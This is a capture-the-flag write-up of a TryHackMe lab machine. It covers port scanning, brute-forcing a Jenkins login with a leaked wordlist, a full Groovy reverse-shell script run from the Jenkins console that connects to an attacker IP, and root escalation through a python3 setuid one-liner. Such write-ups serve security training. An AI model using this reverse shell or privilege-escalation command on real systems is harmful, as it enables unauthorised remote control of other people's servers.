## boot2root

This challenge was hosted on [TryHackMe](https://tryhackme.com/). We launch an instance and start by running an nmap quick scan on the machine’s IP address to check for open ports:

```
nmap -T4 -A -F 10.10.156.214
```

```
Host is up (0.16s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   closed ftp
80/tcp   open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: CyberGrabs Jr CTF
| http-methods:

```

We start by browsing port 80 checking common files like `robots.txt` and we can find 2 interesting files:

![robots.txt](/static/images/cyber-grabs-ctf-0x03/robots.png)

As shown below `s3cret` is a wordlist and `confidential` is actually just random data encoded with Base32 with nothing useful for the challenge:

| :-------------------------------------------------------: |
|                         _s3cret_                          |

| :-------------------------------------------------------------------: |
|                            _confidential_                             |

| :-------------------------------------------------------------------------------: |
|                               _Base32 decoded data_                               |

We try running several wordlists using dirbuster but we don’t find any other directories on port 80.

We proceed by going to port 8080 which had a Jenkins login page.

![Jenkins](/static/images/cyber-grabs-ctf-0x03/jenkins.png)

First idea we had was using the wordlist provided in `s3cret` to bruteforce the login page. Jenkins default username is `admin` so we start by bruteforcing that user. Unfortunetaly that idea didn’t work.

After a lot of trial and error we go back to the challenge description and notice that the name `Alison` is mentioned so we decided to try it as a username and bruteforce it again with the `s3cret` wordlist:

![Bruteforce Burp](/static/images/cyber-grabs-ctf-0x03/burp_bf.png)

We finally found the password `elizabeth1`.

We proceed by logging in to Jenkins:

![Logged in](/static/images/cyber-grabs-ctf-0x03/logged_in.png)

We proceed by going to the script console in order to have a reverse shell on the server as shown below:

```Groovy
String host="10.11.60.43";;
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close()
```

![Script Console](/static/images/cyber-grabs-ctf-0x03/script_console.png)

And now we have a shell:

![First shell](/static/images/cyber-grabs-ctf-0x03/first_shell.png)

We continue by stabilising the shell using `stty` as shown below:

![Stable](/static/images/cyber-grabs-ctf-0x03/stable.png)

And we manage to find the first flag in `/home/mrgrep/user.txt`. A Base32 encoded flag:

![User.txt](/static/images/cyber-grabs-ctf-0x03/user.txt.png)

![Decoded user.txt](/static/images/cyber-grabs-ctf-0x03/decoded_user.txt.png)

For the second part of the challenge, we need to get root access in order to read the `root.txt` file.

We notice that python has setuid capabilities by running `getcap`:

![getcap](/static/images/cyber-grabs-ctf-0x03/getcap.png)

This means that we can use python in order to perform a privilege escalation and get full root access by running `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`:

![Priv Escalation](/static/images/cyber-grabs-ctf-0x03/privesc.png)

Finally, we have root access and we can read the `root.txt` and get the final flag:

![Root](/static/images/cyber-grabs-ctf-0x03/rootflag.png)
